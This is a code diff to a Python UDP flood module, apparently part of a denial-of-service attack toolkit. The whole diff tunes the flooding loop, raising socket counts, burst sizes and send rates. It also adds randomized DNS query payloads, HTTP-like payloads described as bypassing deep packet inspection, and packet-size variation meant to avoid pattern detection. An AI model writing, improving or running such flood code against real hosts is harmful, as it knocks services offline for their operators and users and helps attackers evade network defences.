@@ -12,7 +12,7 @@ class UDPFlooder(AttackModule):
     def __init__(self, targets: List[str], ports: List[int], packet_size: int = 1024, 
                  duration: int = 60, threads: int = 5, debug: bool = False, proxy_manager=None):
         super().__init__(targets, ports)
-        self.packet_size = packet_size
+        self.packet_size = packet_size  # Remove artificial limit
         self.duration = duration
         self.threads = threads
         self.debug = debug
@@ -26,23 +26,27 @@ class UDPFlooder(AttackModule):
         ]
         
         # Performance optimization settings
-        self.sockets_per_thread = 32  # Increased from 8 to 32 for more parallel connections
-        self.packet_cache_size = 500  # Increased from 200 to 500
-        self.target_bandwidth = 1024 * 1024 * 1024  # Increased to 1 GB/s target
+        self.sockets_per_thread = 32  # Increased from 8
+        self.packet_cache_size = 250  # Increased from 100
+        self.target_bandwidth = 50 * 1024 * 1024  # Increased to 50 MB/s target
         
         # Socket pool management
         self.socket_pools = [{} for _ in range(self.sockets_per_thread)]
         self.socket_pool_locks = [threading.Lock() for _ in range(self.sockets_per_thread)]
         
         # Advanced timing and burst control
-        self.burst_size = 5000  # Increased from 1000 to 5000 packets per burst
-        self.min_burst_interval = 0.0001  # Decreased from 0.001 to 0.0001
-        self.adaptive_timing = True  # Enable adaptive timing based on performance
+        self.burst_size = 5000  # Increased from 1000
+        self.min_burst_interval = 0.0001  # Decreased for higher throughput
+        self.adaptive_timing = True
+        
+        # Add rate limiting - but with higher limits
+        self.packets_per_second = self.target_bandwidth / self.packet_size
+        self.interval = 1.0 / self.packets_per_second
         
         # Packet generation optimization
         self.use_memory_efficient_payloads = True
-        self.precomputed_payload_sizes = [64, 128, 256, 512, 1024, 1472, 2048, 4096]
-        self.payload_pool = {}  # Will store precomputed payloads
+        self.precomputed_payload_sizes = [64, 128, 256, 512, 1024, 2048, 4096]  # Added larger sizes
+        self.payload_pool = {}
         self.payload_pool_lock = threading.Lock()
         
         # Performance monitoring
@@ -68,13 +72,13 @@ class UDPFlooder(AttackModule):
         
         # DNS payload templates (port 53)
         self.payload_templates[53] = []
-        for _ in range(10):  # Create 10 different DNS query templates
+        for _ in range(20):  # Increased from 10 to 20 different DNS query templates
             transaction_id = random.randint(0, 65535)
             flags = random.choice([0x0100, 0x8000, 0x8180, 0x8580])
-            qdcount = random.randint(1, 3)
-            ancount = random.randint(0, 2)
-            nscount = random.randint(0, 2)
-            arcount = random.randint(0, 2)
+            qdcount = random.randint(1, 5)  # Increased max queries
+            ancount = random.randint(0, 3)  # Increased max answers
+            nscount = random.randint(0, 3)  # Increased max name servers
+            arcount = random.randint(0, 3)  # Increased max additional records
             
             # Create the DNS header
             header = struct.pack('!HHHHHH',
@@ -86,8 +90,8 @@ class UDPFlooder(AttackModule):
                 arcount
             )
             
-            # Generate a domain template
-            domain_template = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-', k=8)) + '.' + random.choice(self.dns_domains)
+            # Generate a domain template with more randomness
+            domain_template = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-', k=12)) + '.' + random.choice(self.dns_domains)
             
             self.payload_templates[53].append({
                 'header': header,
@@ -95,23 +99,43 @@ class UDPFlooder(AttackModule):
                 'qdcount': qdcount
             })
         
-        # Generate generic payload patterns for other ports
+        # Generate generic payload patterns for other ports with more variety
         self.payload_patterns = {}
         for size in self.precomputed_payload_sizes:
             # Create different pattern types
             self.payload_patterns[size] = []
             
-            # Completely random binary data
-            self.payload_patterns[size].append(random.randbytes(size))
+            # Add more pattern variations (10 instead of 3)
+            # 1. Completely random binary data
+            for _ in range(3):
+                self.payload_patterns[size].append(random.randbytes(size))
             
-            # Repeating pattern (more compressible, might bypass some filters)
-            pattern = random.randbytes(min(64, size))
-            repeated = pattern * (size // len(pattern) + 1)
-            self.payload_patterns[size].append(repeated[:size])
+            # 2. Repeating patterns with different chunk sizes
+            for chunk_size in [16, 32, 64]:
+                if chunk_size < size:
+                    pattern = random.randbytes(chunk_size)
+                    repeated = pattern * (size // len(pattern) + 1)
+                    self.payload_patterns[size].append(repeated[:size])
             
-            # ASCII printable characters (might be more effective against text-based protocols)
-            ascii_pattern = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)).encode()
-            self.payload_patterns[size].append(ascii_pattern[:size])
+            # 3. ASCII printable characters
+            for _ in range(2):
+                ascii_pattern = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)).encode()
+                self.payload_patterns[size].append(ascii_pattern[:size])
+            
+            # 4. HTTP-like patterns to bypass DPI
+            if size >= 64:
+                http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
+                http_method = random.choice(http_methods)
+                http_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
+                http_host = random.choice(['example.com', 'google.com', 'cloudflare.com', 'akamai.net'])
+                http_req = f"{http_method} {http_path} HTTP/1.1\r\nHost: {http_host}\r\n\r\n".encode()
+                
+                # Pad to desired size
+                if len(http_req) < size:
+                    padding = random.randbytes(size - len(http_req))
+                    http_req += padding
+                
+                self.payload_patterns[size].append(http_req[:size])
         
     def get_optimized_payload(self, port: int, size: Optional[int] = None) -> bytes:
         """Get an optimized payload for the given port and size"""
@@ -182,11 +206,11 @@ class UDPFlooder(AttackModule):
             if key not in self.socket_pools[pool_index]:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 
-                # Enhanced socket configuration for maximum performance
+                # Enhanced socket configuration with larger buffer sizes
                 try:
-                    # Maximize socket buffer sizes (increased significantly)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32 * 1024 * 1024)  # 32MB buffer
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 32 * 1024 * 1024)  # 32MB buffer
+                    # Set larger buffer sizes for higher throughput
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)  # 16MB buffer
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024 * 1024)  # 16MB buffer
                     
                     # Set highest priority
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
@@ -237,100 +261,69 @@ class UDPFlooder(AttackModule):
         # Create multiple sockets for this worker
         sockets = [self.get_socket(target, port, i % self.sockets_per_thread) for i in range(self.sockets_per_thread)]
         
-        # Pre-generate larger payload cache
-        payloads = [self.get_optimized_payload(port) for _ in range(self.packet_cache_size)]
+        # Pre-generate larger payload cache with varied sizes for unpredictability
+        payloads = []
+        for _ in range(self.packet_cache_size):
+            # Vary packet sizes to avoid pattern detection
+            size = random.choice(self.precomputed_payload_sizes)
+            payloads.append(self.get_optimized_payload(port, size))
+        
         payload_index = 0
         
         # Calculate burst parameters based on target bandwidth
         target_pps = self.target_bandwidth / self.packet_size
-        packets_per_burst = min(self.burst_size, max(1000, int(target_pps * 0.2)))  # Increased to 20% of target PPS
+        packets_per_burst = min(self.burst_size, max(1000, int(target_pps * 0.5)))  # Increased from 0.2
         
         # Adaptive timing parameters
         last_burst_time = time.time()
         socket_index = 0
         success_count = 0
         failure_count = 0
-        adaptive_interval = self.min_burst_interval
         
-        # Batch sending setup
-        max_batch_size = 128  # Send up to 128 packets before checking time
+        # Batch sending setup - increased for higher throughput
+        max_batch_size = 256  # Increased from 128
         current_batch = 0
         
         # For DNS attacks, we want different subdomains each time
         if port == 53:
             dns_refresh_counter = 0
         
+        last_packet_time = time.time() - 0.1  # Start with a slight offset to send immediately
+        
         while self.running:
             try:
-                current_time = time.time()
-                
-                # Check if it's time for a new burst
-                if current_time - last_burst_time >= adaptive_interval:
-                    burst_start_time = time.time()
-                    sent_this_burst = 0
-                    bytes_this_burst = 0
+                # Batch sending for higher throughput
+                for _ in range(max_batch_size):
+                    # Send one packet
+                    sock = sockets[socket_index]
+                    socket_index = (socket_index + 1) % len(sockets)
                     
-                    # Send packets in smaller batches for better control
-                    for _ in range(0, packets_per_burst, max_batch_size):
-                        batch_size = min(max_batch_size, packets_per_burst - sent_this_burst)
+                    payload = payloads[payload_index]
+                    payload_index = (payload_index + 1) % len(payloads)
+                    
+                    try:
+                        sock.sendto(payload, (target, port))
+                        success_count += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(payload)
+                        self.stats["successful"] += 1
+                    except (socket.error, OSError):
+                        failure_count += 1
+                        self.stats["failures"] += 1
                         
-                        for _ in range(batch_size):
-                            sock = sockets[socket_index]
-                            socket_index = (socket_index + 1) % len(sockets)
-                            
-                            payload = payloads[payload_index]
-                            payload_index = (payload_index + 1) % len(payloads)
-                            
-                            # For DNS, refresh payloads more frequently to vary subdomains
-                            if port == 53:
-                                dns_refresh_counter += 1
-                                if dns_refresh_counter >= 50:  # Refresh every 50 packets
-                                    dns_refresh_counter = 0
-                                    payloads[payload_index] = self.get_optimized_payload(port)
-                            
-                            try:
-                                sock.sendto(payload, (target, port))
-                                sent_this_burst += 1
-                                bytes_this_burst += len(payload)
-                                success_count += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(payload)
-                                self.stats["successful"] += 1
-                            except (socket.error, OSError):
-                                failure_count += 1
-                                self.stats["failures"] += 1
-                                
-                                # Only recreate socket every 100 failures to avoid overhead
-                                if failure_count % 100 == 0:
-                                    try:
-                                        sockets[socket_index] = self.get_socket(target, port, socket_index % self.sockets_per_thread)
-                                    except Exception:
-                                        pass
-                        
-                        # Quick check if we need to stop
-                        if not self.running:
-                            break
-                    
-                    # Adaptive timing adjustments
-                    burst_duration = time.time() - burst_start_time
-                    if burst_duration < adaptive_interval:
-                        # We completed faster than our interval, try to speed up
-                        adaptive_interval = max(self.min_burst_interval, 
-                                             adaptive_interval * 0.95)
-                    else:
-                        # We're too slow, increase interval slightly
-                        adaptive_interval = min(0.01, adaptive_interval * 1.05)
-                    
-                    last_burst_time = current_time
+                        # Recreate socket on failure
+                        try:
+                            sockets[socket_index] = self.get_socket(target, port, socket_index % self.sockets_per_thread)
+                        except:
+                            pass
                 
-                else:
-                    # Minimal sleep to prevent CPU overload
-                    time.sleep(0.00001)
+                # Minimal sleep between batches to prevent CPU overload
+                time.sleep(0.0001)
                     
             except Exception as e:
                 if self.debug:
                     UI.print_error(f"Error in flood_target: {str(e)}")
-                time.sleep(0.0001)
+                time.sleep(0.0005)  # Reduced sleep time on error
         
         # Cleanup
         for sock in sockets:
